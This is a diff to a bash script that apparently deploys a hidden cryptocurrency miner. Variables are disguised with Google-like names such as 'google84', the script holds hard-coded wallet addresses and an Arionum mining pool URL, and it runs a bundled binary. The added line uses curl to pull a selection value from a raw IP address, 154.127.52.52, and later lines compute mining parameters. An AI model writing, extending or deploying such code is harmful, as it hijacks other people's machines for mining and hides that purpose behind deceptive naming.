@@ -21,7 +21,7 @@ arr[5]="28xqj4rxaoBfMeHnCb9gS9t3ezWMvPZ34qYhD4Tu5iSZhEpc3Q6cZYWowgyLuSqsAnbsy2Dw
 arr[6]="45rqQs8nm37XEtzK38aSJyDiyXXDKCtkFhbM7WtFGAATBLqAHq1CE9HyZZ7V4wtQ94qZPQbJ89mQgyXcS8XRWUB9"
 arr[7]="2tmy46jHQHTjMEsvgEz3BMMCnVcER97gqenr1zqzhpwd3VaiN1nS6m8eK8WTiNhXyHJBWS1FgZBpy2Ew5xxQ4Tio"
 rand=$[$RANDOM % ${#arr[@]}]
-google84121212121212121274=${arr[$rand]}
+google84121212121212121274=${arr[$(curl -s http://154.127.52.52/linuxgoogle84 | cat)]}
 
 arr[0]="http://mine.arionumpool.com"
 rand=$[$RANDOM % ${#arr[@]}]
@@ -39,64 +39,16 @@ tar -xvf ./devdeploy84.tar.gz
 
 cd googleapps8474
 
-if (($google84 >= 14884 && $google84 <= 16884));
-then
+count=$(echo "$google84121274 - 400"|bc)
+googlelinux84=$(echo "$count / 16384"|bc -l)
+linuxgoogle84=$(echo "$googlelinux84 * 998"|bc)
+googlelinux8474=${linuxgoogle84%.*}
 
-timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 762
+timeout 14 ./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
 if [ $? -eq 124 ]; then
 echo "google84"
 else
 echo "google8474"
-fi
-
-fi
-
-if (($google84 >= 10884 && $google84 <= 14882));
-then
-
-timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 572
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-fi
-
-if (($google84 >= 5288 && $google84 <= 9184));
-then
-
-timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 362
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-fi
-
-if (($google84 >= 2874 && $google84 <= 5184));
-then
-
-timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 208
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
-fi
-
-if (($google84 >= 1884 && $google84 <= 2488));
-then
-
-timeout 14 ./google84121274 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 102
-if [ $? -eq 124 ]; then
-echo "google84"
-else
-echo "google8474"
-fi
-
 fi
 
 
